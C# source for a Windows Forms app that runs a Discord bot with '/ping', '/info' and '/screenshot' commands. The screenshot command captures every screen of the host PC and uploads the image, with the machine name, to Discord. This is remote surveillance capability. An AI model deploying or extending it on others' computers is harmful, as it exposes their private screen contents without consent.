using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.Entities;
using DSharpPlus.SlashCommands;
using Microsoft.Extensions.DependencyInjection;

namespace DiscordScreenshotApp
{
    public partial class MainForm : Form
    {
        private DiscordClient _discord;
        private CommandsNextExtension _commands;
        private SlashCommandsExtension _slashCommands;

        public MainForm()
        {
            InitializeComponent();


            _discord = new DiscordClient(new DiscordConfiguration
            {
                Token = "BOT_TOKEN", // Put here your bot token
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.All,
                MinimumLogLevel = Microsoft.Extensions.Logging.LogLevel.Debug // You can adjust this as needed
            });

            _commands = _discord.UseCommandsNext(new CommandsNextConfiguration
            {
                StringPrefixes = new[] { "/" }
            });

            // Initialize the SlashCommandsExtension
            _slashCommands = _discord.UseSlashCommands(new SlashCommandsConfiguration
            {
                Services = new ServiceCollection()
                    .AddSingleton<Random>() // You can add other services here if needed
                    .BuildServiceProvider()
            });

            // Register the "/ping" slash command
            _slashCommands.RegisterCommands<PingCommandModule>();
            // Register the "/info" command
            _slashCommands.RegisterCommands<InfoCommandModule>();
            // Register the "/screenshot" command
            _slashCommands.RegisterCommands<ScreenshotCommandModule>();

            // Connect the bot to Discord
            ConnectBotAsync().ConfigureAwait(false);
        }

        private async Task ConnectBotAsync()
        {
            await _discord.ConnectAsync();
            await Task.Delay(-1); // Keep the bot running indefinitely
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private bool mouseDown;
        private Point lastLocation;

        private void MainForm_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void MainForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                this.Location = new Point(
                    (this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);

                this.Update();
            }
        }

        private void MainForm_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
    }

    public class PingCommandModule : ApplicationCommandModule
    {
        [SlashCommand("ping", "Responds with Pong")]
        public async Task Ping(InteractionContext ctx)
        {
            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder()
                .WithContent("Pong"));
        }
    }

    public class InfoCommandModule : ApplicationCommandModule
    {
        [SlashCommand("info", "Displays the name of the PC where the program is running")]
        public async Task Info(InteractionContext ctx)
        {
            var pcName = Environment.MachineName;

            var embed = new DiscordEmbedBuilder
            {
                Title = "PC INFO",
                Description = $" PC: {pcName}",
                Color = new DiscordColor(0x00ff00) // Color
            };

            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder()
                .AddEmbed(embed));
        }
    }

    public class ScreenshotCommandModule : ApplicationCommandModule
    {
        [SlashCommand("screenshot", "Takes a screenshot of all screens")]
        public async Task Screenshot(InteractionContext ctx)
        {
            var pcName = Environment.MachineName;

            var embed = new DiscordEmbedBuilder
            {
                Title = "Screenshot",
                Description = $"Screenshot of all screens from PC: {pcName}",
                Color = new DiscordColor(0x00ff00) // Color
            };

            // Capture all screens and convert to byte array
            var screenshot = CaptureScreens();
            var byteArray = ImageToByteArray(screenshot);

            // Send the initial response with the embed
            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder().AddEmbed(embed));

            // Send the screenshot as an attachment in a regular message
            await ctx.FollowUpAsync(new DiscordFollowupMessageBuilder().AddFile("screenshot.png", new MemoryStream(byteArray)).AddEmbed(embed));
        }

        private Bitmap CaptureScreens()
        {
            var allScreens = Screen.AllScreens;
            var totalWidth = 0;
            var maxHeight = 0;

            // Calculate the total width and maximum height
            foreach (var screen in allScreens)
            {
                totalWidth += screen.Bounds.Width;
                if (screen.Bounds.Height > maxHeight)
                    maxHeight = screen.Bounds.Height;
            }

            // Create a new bitmap to hold the combined screenshot
            var screenshot = new Bitmap(totalWidth, maxHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            // Capture each screen and paste it onto the combined bitmap
            using (var graphics = Graphics.FromImage(screenshot))
            {
                var xPosition = 0;
                foreach (var screen in allScreens)
                {
                    graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, xPosition, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    xPosition += screen.Bounds.Width;
                }
            }

            return screenshot;
        }

        private byte[] ImageToByteArray(Image image)
        {
            using (var ms = new MemoryStream())
            {
                image.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return ms.ToArray();
            }
        }
    }
}
